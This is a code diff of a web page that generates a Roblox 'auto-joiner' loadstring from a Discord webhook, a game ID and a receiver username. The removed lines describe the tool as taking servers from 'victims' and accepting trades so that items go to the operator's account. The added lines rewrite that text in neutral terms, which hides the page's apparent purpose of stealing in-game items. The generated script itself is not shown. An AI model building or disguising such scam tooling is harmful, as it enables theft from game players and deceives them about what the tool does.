@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Joiner Generator</title>
+    <title>Ripples Auto-Joiner Generator</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -67,6 +67,7 @@
             margin-bottom: 16px;
             max-height: 300px;
             overflow: auto;
+            white-space: pre-wrap;
         }
         .copy-btn {
             background: #2a2a3e;
@@ -89,9 +90,9 @@
     <div class="container">
         <div class="card">
             <h1>⚡ Auto-Joiner Generator</h1>
-            <div class="sub">Generate a script that auto-joins from Discord webhooks and accepts trades</div>
+            <div class="sub">Generate your own auto-joiner script</div>
             
-            <label>📡 Discord Webhook URL (where victims send servers)</label>
+            <label>📡 Your Discord Webhook URL</label>
             <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
             
             <label>🎮 Target Game ID</label>
@@ -99,11 +100,10 @@
                 <option value="142823291">Murder Mystery 2 (142823291)</option>
                 <option value="2753915549">Blox Fruits (2753915549)</option>
                 <option value="3956818381">Adopt Me! (3956818381)</option>
-                <option value="6309113114">Tap Simulator (6309113114)</option>
             </select>
             
-            <label>👤 Your Username (who receives the items)</label>
-            <input type="text" id="receiverName" placeholder="your_username_here">
+            <label>👤 Your Roblox Username</label>
+            <input type="text" id="receiverName" placeholder="your_username">
             
             <label>⏱️ Check Interval (seconds)</label>
             <input type="number" id="interval" value="3" min="1" max="10">
@@ -121,6 +121,9 @@
     </div>
 
     <script>
+        const generateBtn = document.getElementById('generateBtn');
+        generateBtn.onclick = generateLoadstring;
+        
         async function generateLoadstring() {
             const webhook = document.getElementById('webhook').value;
             const gameId = document.getElementById('gameId').value;
@@ -157,7 +160,7 @@
                 
                 if (data.success) {
                     document.getElementById('loadstringOutput').textContent = data.loadstring;
-                    statusDiv.innerHTML = '<div class="status success">✅ Script created! Copy the loadstring above.</div>';
+                    statusDiv.innerHTML = '<div class="status success">✅ Script generated! Copy the loadstring above.</div>';
                 } else {
                     statusDiv.innerHTML = `<div class="status error">❌ Error: ${data.error}</div>`;
                 }
